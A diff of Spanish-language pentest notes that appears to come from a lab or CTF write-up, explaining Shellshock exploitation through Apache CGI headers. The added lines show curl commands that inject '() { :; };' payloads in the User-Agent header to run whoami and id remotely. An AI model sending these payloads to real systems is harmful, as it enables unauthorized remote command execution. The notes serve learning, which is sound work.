@@ -83,8 +83,19 @@ tshark -r Captura.cap -Y 'http' -Tfields -e 'tcp.payload' 2>/dev/null | xxd -ps 
 
 Observamos estas cabecera *User-Agent*, *Referer*, *Cookie* ya que cuando *Apache* ejecuta un *CGI* se pueden usar determinados headers HTTP para ser convertidas en variables de entorno para el proceso *CGI*. Si la *bash* ejecutada en la maquina victima en `/cgi-bin/user.sh` es una versión vulnerable, el contenido de las variables que se crean con los *headers* podría acabar siendo interpretado por la *bash*.
 
-Lo que tendremos que probar ahora es a realizar peticiones con [[CURL]] modificando las cabeceras en busqueda de respuestas diferentes.
+Lo que tendremos que probar ahora es a realizar peticiones con [[CURL]] modificando las cabeceras en búsqueda de respuestas diferentes.
+```shell
+curl -s -X GET "http://10.129.55.231/cgi-bin/user.sh" -H "User-Agent: () { :; };echo; /usr/bin/whoami"
+```
 
+En este caso al modificar la cabecera de *User-Agent* hemos conseguido ejecutar un `whoami` en la maquina victima obteniendo el nombre de un usuario llamado *Shelly*.
+![[Pasted image 20260909130031.png]]
 
+Por lo que se nos desvela que tenemos ejecucion remota de comandos lo podemos validar usando otro comando como puede ser `id`
+```shell
+curl -s -X GET "http://10.129.55.231/cgi-bin/user.sh" -H "User-Agent: () { :; };echo; /usr/bin/id"
+```
+
+![[Pasted image 20260909130106.png]]
 
 
